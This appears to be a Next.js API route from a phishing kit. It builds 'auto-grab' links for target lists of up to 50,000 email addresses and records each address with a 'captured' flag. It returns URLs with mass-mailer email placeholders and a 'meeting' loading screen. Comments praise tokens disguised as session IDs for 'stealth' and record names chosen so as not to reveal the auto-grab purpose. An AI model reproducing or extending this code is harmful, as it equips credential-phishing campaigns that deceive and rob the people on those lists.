import { NextRequest, NextResponse } from 'next/server'
// PHASE 7.4: Use SQLite instead of JSON
import { createLinkRecord, type LinkRecord } from '@/lib/linkDatabaseSql'
import { sql } from '@/lib/sql'
import { buildFinalLinkURL } from '@/lib/linkUrlBuilder'
import type { LinkFormat } from '@/lib/linkManagerTypes'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const {
      autoGrabFormat, // Sender Auto Grab Format (e.g., "++email64++")
      autoGrabType,   // Auto Grab Type (encoding pattern)
      redirectType,
      subdomain,
      template,
      loadingScreen,
      loadingDuration,
      link,
      allowedEmails, // Email list for this auto-grab link
      link_format,
    } = body
    
    // GENERIC LINK FIX: Generic Links don't use link_format parameter
    // They always generate: ?token=xxx (NO email in URL)
    // Visitors enter email on landing page, validated against allowedEmails array
    // This is the CORRECT Generic Link behavior

    // PRIORITY ZERO FIX: Validate email list - reject if blank
    if (!allowedEmails || !Array.isArray(allowedEmails) || allowedEmails.length === 0) {
      return NextResponse.json(
        { error: 'Email list is required for Type B auto-grab links' },
        { status: 400 }
      )
    }

    // PRIORITY ZERO FIX: Filter out blank emails
    const validEmails = allowedEmails.filter(email => email && email.trim() && email.includes('@'))
    if (validEmails.length === 0) {
      return NextResponse.json(
        { error: 'At least one valid email is required' },
        { status: 400 }
      )
    }

    if (validEmails.length > 50000) {
      return NextResponse.json(
        { error: 'Maximum 50,000 emails allowed' },
        { status: 400 }
      )
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    const invalidEmails = validEmails.filter(email => !emailRegex.test(email.trim()))
    if (invalidEmails.length > 0) {
      return NextResponse.json(
        { error: `Invalid email format: ${invalidEmails.slice(0, 5).join(', ')}${invalidEmails.length > 5 ? '...' : ''}` },
        { status: 400 }
      )
    }


    // PHASE 7.2 FIX: Generate a legitimate-looking token (no "autograb" prefix - stealth!)
    // Format: timestamp + random alphanumeric (looks like session ID)
    const timestamp = Date.now()
    const randomPart = Math.random().toString(36).substring(2, 8) + Math.random().toString(36).substring(2, 8)
    const token = `${timestamp}_${randomPart}` // Looks like: 1763058004035_a1b2c3d4
    
    // PHASE 7.2 FIX: Validate token format and ensure it's not empty
    if (!token || token.trim() === '' || !/^\d+_[a-z0-9]+$/i.test(token)) {
      console.error('[GENERATE-AUTOGRAB] Failed to generate valid token:', token)
      return NextResponse.json(
        { error: 'Failed to generate valid token format' },
        { status: 500 }
      )
    }
    
    // PHASE 7.2 FIX: Log token generation
    console.log('[GENERATE-AUTOGRAB] Generated token:', {
      token: token.substring(0, 30) + '...',
      emailCount: validEmails.length,
    })
    
    const expiresAt = Math.floor((Date.now() + (30 * 24 * 60 * 60 * 1000)) / 1000) // Unix timestamp in seconds

    // PHASE 7.4: Save link to SQLite instead of JSON
    let linkRecord: LinkRecord | undefined
    try {
      linkRecord = await createLinkRecord({
        type: 'generic',
        session_identifier: token,
        link_token: token,
        name: `GenericLink_${validEmails.length}emails`, // Don't reveal it's auto-grab
        email: null, // Generic links don't have single email
        template_id: template === 'auto-detect' ? null : template || null,
        template_mode: template === 'auto-detect' ? 'auto' : 'manual',
        loading_screen: loadingScreen || 'meeting',
        loading_duration: loadingDuration || 3,
        expires_at: expiresAt,
        total_emails: validEmails.length,
        link_format: 'B', // PHASE 7.4: Generic links use Format B (email in query param)
      })

      // PHASE 7.4: Save allowed emails to email_allowlists table
      if (!linkRecord || !linkRecord.id) {
        throw new Error('Failed to create link record - missing ID')
      }
      
      const linkId = linkRecord.id // Store in const for TypeScript narrowing
      const now = Math.floor(Date.now() / 1000) // Unix timestamp in seconds
      await sql.tx((db) => {
        const stmt = db.prepare('INSERT INTO email_allowlists (link_id, email, created_at, captured) VALUES (?, ?, ?, ?)')
        for (const email of validEmails) {
          stmt.run(linkId, email.toLowerCase().trim(), now, 0)
        }
      })
    } catch (error) {
      console.error('[GENERATE-AUTOGRAB] Database error:', error)
      return NextResponse.json(
        { 
          error: 'Failed to save link to database',
          details: error instanceof Error ? error.message : 'Unknown error'
        },
        { status: 500 }
      )
    }

    // PRIORITY ZERO FIX: Build proper link with email and sid
    const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 
                   process.env.BASE_URL || 
                   `${request.nextUrl.protocol}//${request.headers.get('host') || 'localhost:3000'}`
    
    // For Type B auto-grab links, we need to generate a link with the first email as example
    // The actual email will be replaced by the sender
    const exampleEmail = validEmails[0].toLowerCase().trim()
    
    // GENERIC LINK FIX: Build Generic Link with placeholder
    // Include the placeholder from "Sender Auto Grab Format"
    // Sender will replace placeholder with actual email before sending
    
    let emailPlaceholder = '++email++' // Default placeholder
    
    // Use autoGrabFormat if provided (e.g., "++email64++", "++email++")
    if (autoGrabFormat && autoGrabFormat.trim() !== '') {
      emailPlaceholder = autoGrabFormat.trim()
    }
    
    // Build URL with placeholder
    const finalUrl = `${baseUrl}/?token=${encodeURIComponent(token)}&email=${emailPlaceholder}`
    
    console.log('[GENERATE-AUTOGRAB] Generated Generic Link with placeholder:', {
      token: token.substring(0, 20) + '...',
      allowedEmailsCount: validEmails.length,
      placeholder: emailPlaceholder,
      url: finalUrl,
      note: 'Sender will replace placeholder with actual email',
    })

    // PHASE 7.4: Return only JSON-safe values
    return NextResponse.json({
      success: true,
      token: String(token),
      linkId: String(linkRecord?.id || `link_${token}`),
      link: String(finalUrl),
      expiresAt: Number(expiresAt),
      allowedEmailsCount: Number(validEmails.length),
      note: 'Generic Link - visitors enter email, validated against allowedEmails list',
    })
  } catch (error) {
    return NextResponse.json(
      { error: 'Failed to generate auto grab link' },
      { status: 500 }
    )
  }
}


